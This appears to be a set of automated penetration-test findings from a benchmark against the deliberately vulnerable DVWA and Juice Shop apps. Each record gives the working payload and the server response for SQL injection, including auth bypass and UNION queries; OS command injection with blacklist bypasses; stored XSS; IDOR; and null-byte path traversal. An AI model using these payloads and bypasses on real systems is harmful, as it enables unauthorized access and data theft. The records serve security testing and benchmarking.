findings.title: SQL Injection (boolean) in DVWA sqli id parameter [low]
findings.response_evidence: [security=low] TRUE payload `1' OR '1'='1` returned MULTIPLE seeded user records with surnames: admin (admin), Gordon Brown, Hack Me, Pablo Picasso, Bob Smith. FALSE payload `1' AND '1'='2` returned ZERO records (User ID: section empty). This boolean differential proves SQL injection. DB: mysql.

findings.title: OS Command Injection in DVWA exec ip parameter [low]
findings.response_evidence: [security=low] Payload `127.0.0.1; whoami` produced normal ping output followed by the injected command output `www-data` (the web-process identity), proving arbitrary OS command execution. Verbatim tail of response pre block: "...rtt min/avg/max/mdev = 0.032/0.041/0.049/0.006 ms\nwww-data".

findings.title: Stored XSS in DVWA guestbook mtxMessage [low]
request_sequence: POST /vulnerabilities/xss_s/ txtName=canary&mtxMessage=<script id="test_token">window.xss_flag=1</script>&btnSign=Sign Guestbook (server-side stored; client maxlength=50 not enforced via http_request, payload is 49 chars)
findings.response_evidence: [security=low] The canary `<script id=\"test_token\">window.xss_flag=1</script>` was stored and rendered unescaped into the guestbook page DOM. On loading the rendering page, document.getElementById('test_token').outerHTML == `<script id=\"test_token\">window.xss_flag=1</script>` confirming injection into the document.
findings.browser_js_evidence: window.xss_flag === 1 (evaluated in authenticated dvwa_admin browser context on http://dvwa/vulnerabilities/xss_s/), proving stored script execution.

findings.title: Cross-User Basket Access / BOLA on /rest/basket/{id}
request_sequence: GET /rest/basket/6 as juiceshop_acct1 (own_basket_id=6) -> 200, UserId=22, Products[0]=Apple Juice (1000ml), BasketItem.quantity=3
GET /rest/basket/6 as juiceshop_acct2 (own_basket_id=7) -> 200 returns acct1's basket
findings.response_evidence: Account 2 (acct2_bench@juiceshop.local, own_basket_id=7) requested /rest/basket/6, which belongs to Account 1 (UserId=22). The response (HTTP 200) returned Account 1's distinct seeded item: Products[0].name="Apple Juice (1000ml)" with BasketItem.quantity=3, BasketId=6, UserId=22 — identical to the basket observed in acct1's own session. No authorization check prevents acct2 from reading acct1's basket, confirming BOLA/IDOR.

findings.title: Confidential Acquisitions Memo via Open Directory Listing (/ftp/)
request_sequence: GET /ftp/ (unauth) with Accept: text/html,application/json -> 200 directory listing includes acquisitions.md (909 bytes)
findings.response_evidence: Unauthenticated GET /ftp/ returned a browsable directory listing exposing acquisitions.md (909 bytes) among other files. Direct GET /ftp/acquisitions.md (HTTP 200, text/markdown) returned the confidential memo: "# Planned Acquisitions\n> This document is confidential! Do not distribute!\nOur company plans to acquire several competitors within the next year. This will have a significant stock market impact..." Confidential material disclosed without authentication.

findings.title: Login Authentication-Bypass SQL Injection on /rest/user/login
request_sequence: POST /rest/user/login (unauth) JSON body {"email": "' OR 1=1--", "password": "anything"} -> 200 returns authentication token
findings.response_evidence: Unauthenticated POST with email="' OR 1=1--" and an arbitrary password returned HTTP 200 with {"authentication":{"token":"[REDACTED_JWT]","bid":1,"umail":"admin@juice-sh.op"}}. A valid auth token was issued and the authenticated identity is admin@juice-sh.op (the first/admin user, bid=1), proving SQL injection auth bypass logs in as the first user without valid credentials.

findings.title: Product-Search SQL Injection (SQLite UNION-based) on /rest/products/search
findings.response_evidence: Single-quote probe q=qwert' returns HTTP 500 with SQL error body: "Error: SQLITE_ERROR: near \"'%'\": syntax error" — confirming unsanitized injection into the WHERE/LIKE clause. The crafted 9-column UNION q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9-- returns HTTP 200 with a well-formed JSON row mapping the injected constants directly into the product schema: {"status":"success","data":[{"id":1,"name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9}]}. The injected literals 1-9 appearing in column positions proves attacker-controlled UNION SELECT execution.

findings.title: Unauthenticated User-Feedback PII Exposure on /api/Feedbacks
findings.response_evidence: Without any authentication the endpoint returns HTTP 200 with 8 feedback records tying UserId to comments that disclose author emails. Quoted disclosures from JSON body: UserId 4's comment includes "(***ereum@juice-sh.op)" and additionally leaks a wallet seed phrase: "purpose betray marriage blame crunch monitor spin slide donate sport lift clutch"; other records expose "(***in@juice-sh.op)" (UserId 1) and "(***der@juice-sh.op)" (UserId 3). PII (author email addresses tied to user IDs) disclosed to unauthenticated clients.

findings.title: Poison Null-Byte Path Traversal bypass of /ftp/ extension filter
findings.response_evidence: Raw request GET /ftp/package.json.bak returns HTTP 403: "Error: Only .md and .pdf files are allowed!" (fileServer.js verify filter). Appending a URL-encoded null byte plus allowed extension GET /ftp/package.json.bak%2500.md bypasses the filter and returns HTTP 200 (Content-Type application/octet-stream) with the actual restricted backup file content, e.g.: {"name":"juice-shop","version":"6.2.0-SNAPSHOT","description":"An intentionally insecure JavaScript Web Application",... "dependencies": {"express":"~4.16","sequelize":"~4","sqlite3":"~3.1.13",...}}. The .bak backup was retrieved despite the server's extension allowlist, confirming the null-byte path-traversal bypass.

findings.title: Exposed Encryption-Keys Directory via Browsable Directory Listing
findings.response_evidence: HTTP 200, content-type text/html. Directory is browsable and the listing discloses sensitive key files: "listing directory /encryptionkeys/ ... Name Size Modified jwt.pub 248 12/19/2023 1:12:12 PM premium.key 50 12/19/2023 1:12:12 PM". Both premium.key (50 bytes) and jwt.pub (248 bytes) are present and directly linked (/encryptionkeys/jwt.pub, /encryptionkeys/premium.key).

findings.title: Poison Null-Byte Path Traversal Bypass to Restricted Backup File (/ftp/package.json.bak)
findings.response_evidence: Raw path GET /ftp/package.json.bak returns HTTP 403 with extension filter error: "Error: Only .md and .pdf files are allowed! ... at verify (/juice-shop/build/routes/fileServer.js:55:18)". Appending the URL-encoded null byte + allowed extension (package.json.bak%2500.md) bypasses the filter: HTTP 200, content-type application/octet-stream, returning the restricted backup contents: '{ "name": "juice-shop", "version": "6.2.0-SNAPSHOT", "description": "An intentionally insecure JavaScript Web Application" ... "dependencies": { "express": "~4.16", "express-jwt": "0.1.3", "sequelize": "~4", "sqlite3": "~3.1.13" ... } }'. This is the bypass vector (distinct from the raw .bak finding) and demonstrates the full 403-vs-200 pair.

findings.title: SQL Injection via numeric boolean in id (DVWA medium)
findings.response_evidence: [security=medium] Payload TRUE `1 OR 1=1` (no quotes, numeric boolean — bypasses mysqli_real_escape_string). TRUE returned 5 records / seeded surnames: admin, Brown, Me, Picasso, Smith (pre_blocks: "ID: 1 OR 1=1 First name: admin Surname: admin", "...Gordon Brown", "...Hack Me", "...Pablo Picasso", "...Bob Smith"). FALSE payload `1 AND 1=2` returned ZERO records (no pre_blocks, no name/surname rows). Boolean differential proves injection.

findings.title: OS Command Injection via pipe bypass (DVWA medium)
findings.response_evidence: [security=medium] Payload `127.0.0.1| whoami` (pipe bypasses the `;` and `&&` blacklist at medium). Response output contained web-process identity `www-data` (pre_blocks: ["www-data"]), confirming command execution.

findings.title: SQL Injection (out-of-band session-input) [security=high]
request_sequence: POST /vulnerabilities/sqli/session-input.php (dvwa_admin) id=1' OR '1'='1' # & Submit=Submit  -> sets session id
GET /vulnerabilities/sqli/ -> TRUE branch returns 5 seeded surnames: admin, Brown, Me, Picasso, Smith
GET /vulnerabilities/sqli/ -> FALSE branch returns ZERO records
findings.response_evidence: [security=high] Out-of-band injection: the `id` is submitted to session-input.php and the backend query appends LIMIT 1, so a trailing `#` comment is required to neutralize it. TRUE payload `1' OR '1'='1' #` renders 5 distinct seeded surnames (admin, Brown, Me, Picasso, Smith). FALSE payload `1' AND '1'='2' #` renders ZERO records (no First/Surname output present on the rendered /vulnerabilities/sqli/ page). The boolean-controlled difference in returned rows confirms SQL injection at security=high. Level-specific payloads: TRUE=`1' OR '1'='1' #`, FALSE=`1' AND '1'='2' #` (trailing comment mandatory due to appended LIMIT 1).

findings.title: OS Command Injection [security=high]
findings.response_evidence: [security=high] At high security, "; ", "| " (pipe+space), and "&&" are blacklisted. Bypass uses a pipe with NO trailing space: `127.0.0.1|whoami`. The response pre block contained the web-process identity `www-data` (pre_blocks: ["www-data"]; visible_text ends with "Enter an IP address: www-data"), proving OS command execution as the web user. Level-specific payload: `127.0.0.1|whoami`.
